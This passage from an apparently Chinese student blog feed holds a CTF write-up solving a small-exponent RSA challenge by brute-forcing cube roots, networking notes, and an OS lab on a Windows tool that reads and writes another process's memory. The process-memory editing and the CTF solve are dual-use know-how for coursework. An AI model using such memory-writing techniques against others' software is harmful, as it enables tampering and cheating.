        fputc(((v1^v4)-v5),fileNew);
        v4 += 34;
        v5 = (v5 + 2) &amp; 0xF;
    }
    fclose(fileNew);
    fclose(fileOld);
    return 0;
}
</code></pre>
<p>解码后得到flag</p>
<h2 id="Crypto"><a class="header-anchor" href="#Crypto"></a>Crypto</h2>
<p>只做出来一道题</p>
<h3 id="baby"><a class="header-anchor" href="#baby"></a>baby</h3>
<p>一道RSA的密码学题目</p>
<p>给了我们密文c和因数n，e很小。所以可以通过爆破的方式跑出明文</p>
<p>解密脚本</p>
<pre><code>import gmpy
n = 691316677109436623113422493782665795857921917893759942123087462879884062720557906429183155859597756890896192044003240821906332575292476160072039505771794531255542244123516929671277306361467074545720823735806308003091983427678300287709469582282466572230066580195227278214776280213722215953097747453437289734469454712426107967188109548966907237877840316009828476200388327329144783877033491238709954473809991152727333616022406517443130542713167206421787038596312975153165848625721911080561242646092299016802662913017071685740548699163836007474224715426587609549372289181977830092677128368806113131459831182390520942892670696447128631485606579943885812260640805756035377584155135770155915782120025116486061540105139339655722904721294629149025033066823599823964444620779259106176913478839370100891213072100063101232635183636552360952762838656307300621195248059253614745118852163569388418086291748805100175008658387803878200034840215506516715640621165661642177371863874586069524022258642915100615596032443145034847031564356671559179212705466145609698475546210994748949121359853094247990533075004393534565421776468785821261291309463205314057882016266066365636018084499158806717036972590848458891019171583268920180691221168453612029698510271
c = 3442467842482561323703237574537907554035337622762971103210557480050349359873041624336261782731509068910003360547049942482415036862904844600484976674423604861710166033558576921438068555951948966099658902606725292551952345193132973996288566246138708754810511646811362017769063041425115712305629748341207792305694590742066971202523405301561233341991037374101265623265332070787449332991792097090044761973705909217137119649091313457206589803479797894924402017273543719924849592070328396276760381501612934039653
i = 0
while 1:
    if(gmpy.root(c+i*n, 3)[1]==1):
        print gmpy.root(c+i*n, 3)
        break
    i = i+1
</code></pre>
<p>结果是</p>
<pre><code>m=1509929362729692740720713536968392715648402189242304424408501797538190273763219595501810359943405524344790331677540693316488309231687357778980543085568230705511696327037
</code></pre>
<p>再解码得到flag</p>
<pre><code>import libnum
n=1509929362729692740720713536968392715648402189242304424408501797538190273763219595501810359943405524344790331677540693316488309231687357778980543085568230705511696327037
print(libnum.n2s(n))
</code></pre>
<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200920135022901.png" alt="image-20200920135022901"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>OSI模型</title>
    <url>/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="OSI-模型"><a class="header-anchor" href="#OSI-模型"></a>OSI 模型</h2>
<h3 id="应用层"><a class="header-anchor" href="#应用层"></a>应用层</h3>
<p>能产生数据流量的并且能与用户交互的程序</p>
<p>记事本不是，因为不能产生数据流量</p>
<h3 id="表示层"><a class="header-anchor" href="#表示层"></a>表示层</h3>
<p>传递消息的语法和语义（不同内部数据表示法 编码方法 压缩 加密）</p>
<h3 id="会话层"><a class="header-anchor" href="#会话层"></a>会话层</h3>
<p>对话控制（记录该由谁来发送数据）</p>
<p>令牌管理（禁止双方同时执行同一关键操作）</p>
<p>同步功能（设置断点，崩溃恢复）</p>
<h3 id="传输层"><a class="header-anchor" href="#传输层"></a>传输层</h3>
<p>真正的端到端的层。解决的问题：<strong>进程与进程之间传输</strong>、识别进程</p>
<h3 id="网络层"><a class="header-anchor" href="#网络层"></a>网络层</h3>
<p>控制子网的运行 ，如何将数据包从源端路由到接收方。解决的问题：<strong>路由</strong>、<strong>拥塞控制</strong>、<strong>异构网络互联</strong></p>
<h3 id="数据链路层"><a class="header-anchor" href="#数据链路层"></a>数据链路层</h3>
<p>将一个原始的传输设施转变成一条没有漏检传输错误的线路。解决的问题：数据帧、流量控制、信道共享</p>
<h3 id="物理层"><a class="header-anchor" href="#物理层"></a>物理层</h3>
<p>关注在一条通信信道中传输原始比特。解决的问题：1，0的表示、比特维持时间、是否双向同时传输、连接建立，撤销、物理传输介质等</p>
<p><img src="/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/image-20200801114821400.png" alt="image-20200801114821400"></p>
]]></content>
      <categories>
        <category>专业课</category>
        <category>计网</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>TCP&amp;IP</title>
    <url>/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&amp;IP/</url>
    <content><![CDATA[<h2 id="TCP"><a class="header-anchor" href="#TCP"></a>TCP</h2>
<h3 id="三次握手和四次挥手"><a class="header-anchor" href="#三次握手和四次挥手"></a>三次握手和四次挥手</h3>
<p>TCP是可靠的，面向连接的传输层协议，端到端之间要进行TCP通信首先就要建立起TCP连接，当通信结束时断开TCP连接。这里TCP连接的建立与断开过程就分别由<code>三次握手</code>和<code>四次挥手</code>来完成。</p>
<ul>
<li>
<p>三次握手</p>
<p>TCP连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息。具体过程如下图所示。</p>
<p><img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316191610581.png" alt="image-20210316191610581"></p>
<p><strong>第一次握手：</strong> 建立连接。客户端发送连接请求报文段，SYN位置为1，Sequence Number为随机数<code>i</code>；然后，客户端进入SYN_SENT状态，等待服务器的确认；</p>
<p><strong>第二次握手：</strong> 服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为<code>i+1</code> ( Sequence Number+1 )；同时，自己自己还要发送SYN请求信息，SYN设置为1，Sequence Number为<code>j</code>；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RCVD状态；</p>
<p><strong>第三次握手：</strong> 客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为<code>j+1</code>，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</p>
<p>在wireshark中可以分别查看<code>ACK</code>和<code>Seq</code>的实际值和相对值，第一个包的Seq相对值为0。</p>
<p><strong><code>Seq</code>的相对值为当前端已发送的TCP总段长，<code>ACK</code>的相对值为当前端已接收的TCP总段长（单位：字节），</strong><code>SYN</code>标志位和<code>FIN</code>标志位也要占1字节（其他标志位如ACK不占）。</p>
</li>
<li>
<p>四次挥手</p>
<img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316213743223.png" style="zoom:50%;">
<p><strong>中断连接端可以是Client端，也可以是Server端。</strong></p>
<p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说&quot;我Client端没有数据要发给你了&quot;，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，“告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，“告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，&quot;就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，“就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
</li>
</ul>
<h3 id="TCP-UDP"><a class="header-anchor" href="#TCP-UDP"></a>TCP/UDP</h3>
<p>有连接/无连接（可靠/不可靠）</p>
<p>有拆分合并/无拆分合并</p>
<p>有拥塞控制/无拥塞控制（发送速率的调整）</p>
<p>单播/多播</p>
<h3 id="滑动窗口和流量控制"><a class="header-anchor" href="#滑动窗口和流量控制"></a>滑动窗口和流量控制</h3>
<h3 id="拥塞控制"><a class="header-anchor" href="#拥塞控制"></a>拥塞控制</h3>
<h2 id="http-https"><a class="header-anchor" href="#http-https"></a>http/https</h2>
<h3 id="http各版本区别"><a class="header-anchor" href="#http各版本区别"></a>http各版本区别</h3>
<p>http1.0 vs http1.1</p>
<p>http1.1开始，默认使用长连接（HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。）</p>
<p>http1.1增加了一些错误状态码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</p>
<h3 id="SSL-TLS"><a class="header-anchor" href="#SSL-TLS"></a>SSL/TLS</h3>
<ul>
<li>首先由客户端发送Client Hello 消息到服务器，消息中主要包含了客户端支持的<code>ciphersuites</code>， TLS 版本信息和客户端随机数。<strong>注意此时是明文传输</strong></li>
<li>服务器接收到消息后，返回自己支持的<code>ciphersuites</code>， TLS 版本，<strong>自己的数字证书</strong>和服务器端生成的随机数。<strong>注意此时是明文传输</strong></li>
<li>客户端开始验证数字证书，可能会不断往上追溯 CA、CA 的 CA、CA 的 CA 的 CA，直到一个受信的 CA。验证完证书之后生成一个新的<code>pre-master key</code>，再使用证书中的公钥来对<code>pre-master key</code>进行加密，然后发送给服务器。<strong>注意此时是非对称加密传输</strong></li>
<li>服务器接收到客户端发送过来的非对称加密的密文，使用自己的私钥进行解密，获得了<code>pre-master key</code>。<strong>注意此时是非对称加密传输</strong></li>
<li>到这里为止，服务器和客户端都有三组数字，**分别是客户端的随机数、服务器的随机数和pre-master key。**其中由于客户端的随机数和服务器的随机数都是使用明文传输，所以这两个数字是有被暴露的风险的，但是由于<code>pre-master key</code>是使用非对称加密传输，十分安全，所以将这三者结合，使用之前协商好的特定的算法就可以生成一个密钥，这个密钥称为<code>shared secert</code>。也就是之后用来对称加密的密钥。</li>
<li>客户端在计算出对称加密的密钥之后，使用该密钥进行对称加密通信，告知服务器之后都使用该密钥进行对称加密。<strong>注意此时是对称加密传输</strong></li>
<li>服务器接收到密文后，使用之前计算出的密钥来进行对称解密，解密成功之后，再使用该密钥进行对称加密通信。告知客户端密钥确认无误，可以使用该密钥进行通信。<strong>注意此时是对称加密传输</strong></li>
<li>至此，整个TLS的握手过程完整，之后就可以开始对称加密的通信了。</li>
</ul>
<h2 id="参考文章"><a class="header-anchor" href="#参考文章"></a>参考文章</h2>
<ul>
<li><a href="https://blog.csdn.net/whuslei/article/details/6667471">TCP协议中的三次握手和四次挥手(图解)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/72587882">关于 TCP/IP，必知必会的10个问题</a></li>
</ul>
]]></content>
      <categories>
        <category>专业课</category>
        <category>计网</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>指令集和操作系统位数</title>
    <url>/2020/06/10/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%8C%87%E4%BB%A4%E9%9B%86%E5%92%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0/</url>
    <content><![CDATA[<h2 id="指令集"><a class="header-anchor" href="#指令集"></a>指令集</h2>
<p>为了提高编写和运行程序的效率，将一些较为常用的指令（如积分，微分，乘除法等）写成一套标准的程序，即指令集。</p>
<h3 id="X86和ARM"><a class="header-anchor" href="#X86和ARM"></a>X86和ARM</h3>
<p>完整的，复杂的指令集称作<code>CISC</code> (Complex Instruction Set Computing)，在复杂指令集中许多运算是不常用的，让CPU支持所有指令是对晶体管的严重浪费，所以亨尼西和帕特森等人提出了一种更加简单的指令集，叫做精简指令集<code>RISC</code> (Reduced Instruction Set Computing)</p>
<p><code>X86</code>是英特尔推出的一种CPU架构，采用复杂指令集CISC</p>
<p><code>ARM</code>是acorn公司设计的CPU架构，采用精简指令集RISC</p>
<h2 id="操作系统位数"><a class="header-anchor" href="#操作系统位数"></a>操作系统位数</h2>
<p>首先明确<code>CPU位数</code>的概念，CPU位数即CPU在一个时钟周期内能够处理的二进制串的位数，也是CPU寄存器的位数。目前64位的CPU是主流。</p>
<p>而<strong>操作系统位数</strong>即操作系统所依赖的指令集位数，可以理解为：32位的操作系统假定CPU是32位的，64位操作系统则假定CPU是64位的。所以，64位CPU的主机可以安装64位和32位甚至更低位数的操作系统，而32位CPU的主机只能安装32位及以下的操作系统（即向下兼容）。</p>
]]></content>
      <categories>
        <category>专业课</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实验——内存扫描器设计实现</title>
    <url>/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="实验内容"><a class="header-anchor" href="#实验内容"></a>实验内容</h2>
<p>(1) 能直接从当前操作系统（或Windows操作系统或Linux操作系统）内存获取内存存储数据；</p>
<p>(2) 能对获取的数据进行分析，包括内存结构、进程链表、页目录表结构、进程相关信息等；</p>
<p>(3) 设计物理内存内容的定位功能，能快速回到物理内存的起始地址或结束地址；</p>
<p>(4) 设计物理内存数据修改功能，并展示内存数据修改后的结果；</p>
<p>(5) 界面友好</p>
<h2 id="总体设计"><a class="header-anchor" href="#总体设计"></a>总体设计</h2>
<p>在本次实验中，我只实现了读取系统和内存信息，获取进程列表及进程相关信息，内存内容搜索，内存内容修改四个功能。每个功能分别由一个程序模块实现。程序开始运行时，调用<code>getSystemInfo</code>函数获取系统及内存基本信息，再调用<code>getProcessInfo</code>函数获取当前正在运行的所有进程及其对应pid，用户输入进程pid选择要扫描的进程后，调用<code>getMemoryBlock</code>扫描该进程使用的内存，逐一打印内存块信息（起始地址、内存块大小、内存块状态、访问权限等），打印完成后用户选择查询内存内容或者修改内存内容，这两个功能分别由<code>SearchProcessMemory</code>和<code>ModifyProcessMemory</code>实现。</p>
<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps1.jpg" alt="img"></p>
<h2 id="详细设计与实现"><a class="header-anchor" href="#详细设计与实现"></a>详细设计与实现</h2>
<h3 id="数据结构设计"><a class="header-anchor" href="#数据结构设计"></a>数据结构设计</h3>
<ol>
<li>SYSTEM_INFO 系统信息结构体</li>
</ol>
<pre><code>typedef struct _SYSTEM_INFO {
    __C89_NAMELESS union {
      DWORD dwOemId;
      __C89_NAMELESS struct {
  WORD wProcessorArchitecture;
  WORD wReserved;
      } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
    DWORD dwPageSize;					//页面大小
    LPVOID lpMinimumApplicationAddress;	//进程用户区起始地址
    LPVOID lpMaximumApplicationAddress;	//进程用户区上界
    DWORD_PTR dwActiveProcessorMask;
    DWORD dwNumberOfProcessors;
    DWORD dwProcessorType;
    DWORD dwAllocationGranularity;
    WORD wProcessorLevel;
    WORD wProcessorRevision;
  } SYSTEM_INFO;
</code></pre>
<ol start="2">
<li>MEMORYSTATUS 内存信息结构体</li>
</ol>
<pre><code>typedef struct _MEMORYSTATUS {
    DWORD dwLength;			//MEMORYSTATUS结构的大小
    DWORD dwMemoryLoad;		//物理内存使用率
    SIZE_T dwTotalPhys;		//总物理内存
    SIZE_T dwAvailPhys;		//可用物理内存
    SIZE_T dwTotalPageFile;	//总页面文件大小
    SIZE_T dwAvailPageFile;	//可用页面文件大小
    SIZE_T dwTotalVirtual;	//总虚拟内存
    SIZE_T dwAvailVirtual;	//可用虚拟内存
  } MEMORYSTATUS
</code></pre>
<ol start="3">
<li>PROCESSENTRY32 进程快照信息结构体，用于获取正在运行的所有进程的信息</li>
</ol>
<pre><code>typedef struct tagPROCESSENTRY32
{
    DWORD dwSize;	//结构体大小
    DWORD cntUsage;	
    DWORD th32ProcessID;	//进程ID
    ULONG_PTR th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;	//线程数
    DWORD th32ParentProcessID;
    LONG pcPriClassBase;
    DWORD dwFlags;
    TCHAR szExeFile[MAX_PATH];	//进程名称
} PROCESSENTRY32;
</code></pre>
<ol start="4">
<li>MEMORY_BASIC_INFORMATION32</li>
</ol>
<pre><code>typedef struct _MEMORY_BASIC_INFORMATION32 {
      DWORD BaseAddress;	//指向页面区域基地址的指针
      DWORD AllocationBase;//指向VirtualAlloc函数分配的页面范围的基地址的指针。BaseAddress成员指向的页面包含在此分配范围内。
      DWORD AllocationProtect;//最初分配区域时的内存保护选项。该成员可以是内存保护常量之一，如果调用者没有访问权限，则该成员可以为 0。
      DWORD RegionSize;//从所有页具有相同属性的基地址开始的区域大小
      DWORD State;//区域中页面的状态，有MEM_COMMIT、MEM_FREE、MEM_RESERVE三种可能
      DWORD Protect;//区域中页面的访问保护。该成员是为AllocationProtect成员列出的值之一。
      DWORD Type;区域中页面的类型，有MEM_IMAGE、MEM_MAPPED、MEM_PRIVATE三种可能
    } MEMORY_BASIC_INFORMATION32;
</code></pre>
<h3 id="getSystemInfo-模块的设计与实现"><a class="header-anchor" href="#getSystemInfo-模块的设计与实现"></a>getSystemInfo 模块的设计与实现</h3>
<p><code>GetSystemInfo(LPSYSTEM_INFO lpSystemInfo)</code>、<code>GlobalMemoryStatus(LPMEMORYSTATUS lpBuffer)</code>两个Windows提供的API可以分别获取系统信息和系统内存信息，在该模块中只要调用两个API后再打印结构体信息即可。</p>
<h3 id="getProcessInfo-模块的设计与实现"><a class="header-anchor" href="#getProcessInfo-模块的设计与实现"></a>getProcessInfo 模块的设计与实现</h3>
<p>首先调用<code>CreateToolhelp32Snapshot</code>函数获取进程列表快照的句柄，然后遍历进程快照，轮流显示每个进程的信息（PID、进程名、线程数等）。</p>
<h3 id="getMemoryBlock-模块的设计与实现"><a class="header-anchor" href="#getMemoryBlock-模块的设计与实现"></a>getMemoryBlock 模块的设计与实现</h3>
<p>调用<code>OpenProcess()</code>获取想要访问的进程的句柄，循环调用<code>VirtualQueryEx()</code>函数，将返回的<code>MEMORY_BASIC_INFORMATION</code>数据结构保存到列表中，循环遍历列表，打印各个内存块的基本信息。</p>
<h3 id="SearchProcessMemory-模块的设计与实现"><a class="header-anchor" href="#SearchProcessMemory-模块的设计与实现"></a>SearchProcessMemory 模块的设计与实现</h3>
<p>循环遍历存有内存块信息的列表MemList，选择状态为<code>MEM_COMMIT</code>的内存块（这些内存块中的数据值是有效的），再通过<code>ReadProcessMemory()</code>访问该内存区域，遍历该区域，将值为我们查找的内容的内存地址加入列表AddrList。最后将AddList中的地址打印出来。</p>
<h3 id="ModifyProcessMemory-模块的设计与实现"><a class="header-anchor" href="#ModifyProcessMemory-模块的设计与实现"></a>ModifyProcessMemory 模块的设计与实现</h3>
<p>首先通过<code>OpenProcess()</code>获取进程句柄，需要注意的是，在打开进程时要选择获取所有控制权限，否则可能因为权限过低而无法进行内存的修改。<code>VirtualProtectEx()</code>修改内存块的保护模式，然后通过<code>WriteProcessMemory()</code>写入内存块具体位置的值，最后再次调用<code>VirtualProtectEx()</code>还原内存块的保护模式。</p>
<h2 id="运行结果"><a class="header-anchor" href="#运行结果"></a>运行结果</h2>
<p>程序运行界面如图</p>
<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps2.jpg" alt="img"></p>
<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps3.jpg" alt="img"></p>
<p>我们选择要打开的进程，以helloworld测试程序test.exe（PID为1500）为例（系统进程所需权限较高，会打开失败）：</p>
<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps4.jpg" alt="img"></p>
<p>可以看到，成功打开进程后，打印了进程使用的内存块信息，打印完成后选择要执行的功能。以下分别演示内存查询和内存修改。</p>
<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps5.jpg" alt="img"></p>
<p>可以查到存储的值为123456的内存地址有四个。接下来将其中一个的值修改为234567.</p>
<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps6.jpg" alt="img"></p>
<h2 id="源代码"><a class="header-anchor" href="#源代码"></a>源代码</h2>
<p><em>readMemory.cpp</em></p>
<pre><code>#include &quot;stdafx.h&quot;
#include &lt;iostream&gt;
#include &lt;stdio.h&gt;
#include &lt;tchar.h&gt;
#include &lt;windows.h&gt;
#include &lt;string&gt;
#include &lt;list&gt;
#include &lt;iomanip&gt;
#include &lt;tlhelp32.h&gt;
#include &lt;psapi.h&gt;

#define MAX_ADDR_NUM 1024
using namespace std;
#pragma comment(lib,&quot;psapi.lib&quot;)
DWORD dwProcessId[1024], cbNeededProcess;

list&lt;MEMORY_BASIC_INFORMATION&gt;	MemList ;
SYSTEM_INFO systemInfo;
MEMORYSTATUS memstatus;
list&lt;DWORD&gt; AddrList;

void getSystemInfo();
void getProcessInfo();
bool getMemoryBlock(DWORD dwProcessId);
bool SearchProcessMemory(DWORD dwProcessId,DWORD dwValue);
bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,DWORD dwValue);

int _tmain(int argc, _TCHAR* argv[])
{
	cout&lt;&lt;&quot;--------系统及内存信息如下-------&quot;&lt;&lt;endl;
	getSystemInfo();

	//获取当前进程信息
	cout&lt;&lt;endl&lt;&lt;&quot;-----------进程列表如下----------&quot;&lt;&lt;endl;
	getProcessInfo();

	DWORD pid;
	while(TRUE){
		pid=0;
		cout&lt;&lt;&quot;输入你需要访问的进程PID号: &quot;;
		cin&gt;&gt;pid;
		if(!getMemoryBlock(pid)){
			cout&lt;&lt;&quot;PID = &quot;&lt;&lt;(DWORD)pid&lt;&lt;&quot; 的进程打开失败!&quot;&lt;&lt;endl;
		}else{
			char c;
			int mode = 0;
			while(TRUE){
				cout&lt;&lt;endl&lt;&lt;&quot;q: 返回&quot;&lt;&lt;endl&lt;&lt;&quot;s: 内存查询&quot;&lt;&lt;endl&lt;&lt;&quot;m: 内存修改&quot;&lt;&lt;endl;
				cout&lt;&lt;&quot;输入功能对应的字母:&quot;;
				cin&gt;&gt;c;
				if(c=='q'){
					break;
				}
				else if(c=='s'){
					DWORD x;
					cout&lt;&lt;&quot;输入查询的值：&quot;;
					cin&gt;&gt;x;
					if(!SearchProcessMemory(pid,x)){
						cout&lt;&lt;&quot;查询失败!&quot;&lt;&lt;endl;
					}else{
						if(AddrList.size()==0){
							cout&lt;&lt;&quot;未查到值为 &quot;&lt;&lt;(DWORD)x&lt;&lt;&quot; 的内存区域!&quot;&lt;&lt;endl;
						}else{
							cout&lt;&lt;&quot;共查到 &quot;&lt;&lt;AddrList.size()&lt;&lt;&quot;个地址&quot;&lt;&lt;endl;
							list&lt;DWORD&gt;::iterator it;
							int i=0;
							for(it=AddrList.begin();it!=AddrList.end();it++){
								printf(&quot;%d   0x%x \n&quot;,++i,(*it));
							}
						}
					}
				}
				else if(c=='m'){
					DWORD addr;
					DWORD x;
					cout&lt;&lt;&quot;要写入的内存地址(16进制)：&quot;&lt;&lt;endl;
					cin&gt;&gt;hex&gt;&gt;addr;
					// getchar();
					cout&lt;&lt;&quot;要写入的值(10进制)：&quot;&lt;&lt;endl;
					cin&gt;&gt;x;
					if(ModifyProcessMemory(pid,(DWORD)addr,(DWORD)x)){
						cout&lt;&lt;&quot;修改成功!&quot;&lt;&lt;endl;
					}else{
						cout&lt;&lt;&quot;修改失败!&quot;&lt;&lt;endl;
					}
				}
			}
		}
		getProcessInfo();
	}
	return 0;
}



void getSystemInfo(){

	GetSystemInfo(&amp;systemInfo);
	cout&lt;&lt;setw(15)&lt;&lt;&quot;进程用户区上界:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.lpMaximumApplicationAddress&lt;&lt;endl;
	cout&lt;&lt;setw(15)&lt;&lt;&quot;进程用户区起始:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.lpMinimumApplicationAddress&lt;&lt;endl;
	cout&lt;&lt;setw(15)&lt;&lt;&quot;页面大小:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.dwPageSize&lt;&lt;endl;


	GlobalMemoryStatus(&amp;memstatus);
	cout&lt;&lt;setw(15)&lt;&lt;&quot;物理内存使用率:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwMemoryLoad&lt;&lt;endl;
	cout&lt;&lt;setw(15)&lt;&lt;&quot;总物理内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalPhys&lt;&lt;endl;
	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用物理内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailPhys&lt;&lt;endl;
	cout&lt;&lt;setw(15)&lt;&lt;&quot;总页文件:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalPageFile&lt;&lt;endl;
	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用页文件:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailPageFile&lt;&lt;endl;
	cout&lt;&lt;setw(15)&lt;&lt;&quot;总虚拟内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalVirtual&lt;&lt;endl;
	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用虚拟内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailVirtual&lt;&lt;endl;
}


void getProcessInfo(){
	//为进程列表拍摄快照
    HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(hProcessSnap==INVALID_HANDLE_VALUE){
        printf(&quot;CreateToolhelp32Snapshot调用失败!\n&quot;);
        exit(0);
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    //遍历进程快照。轮流显示每个进程的信息
    BOOL bMore=Process32First(hProcessSnap,&amp;pe32);
    int i=0;
    printf(&quot;PID\t线程数\t进程名称\n&quot;);
    while(bMore){

        bMore=Process32Next(hProcessSnap,&amp;pe32);
        _tprintf(_T(&quot;%u\t&quot;),pe32.th32ProcessID);
        _tprintf(_T(&quot;%u\t&quot;),pe32.cntThreads);
        _tprintf(_T(&quot;%s\n&quot;),pe32.szExeFile);

        i++;
    }
    //清除snapshot对象
    CloseHandle(hProcessSnap);
    printf(&quot;进程总数:%d\n&quot;,i);
}


bool getMemoryBlock(DWORD dwProcessId){
	MemList.clear();
	HANDLE hProcess =INVALID_HANDLE_VALUE;
	if(dwProcessId != GetCurrentProcessId()){
		hProcess = OpenProcess( PROCESS_QUERY_INFORMATION|PROCESS_VM_READ , FALSE , dwProcessId);
	}
	if(hProcess == NULL){
		return FALSE;
	}
	MEMORY_BASIC_INFORMATION  MemBaseInfo;
	DWORD  dwInfoSize = sizeof(MEMORY_BASIC_INFORMATION);
	DWORD  dwCurPos = (DWORD)systemInfo.lpMinimumApplicationAddress;
	while(dwCurPos &lt; (DWORD) systemInfo.lpMaximumApplicationAddress ){
		VirtualQueryEx( hProcess,(LPVOID)dwCurPos , &amp;MemBaseInfo,dwInfoSize);
		MemList.push_back(MemBaseInfo);
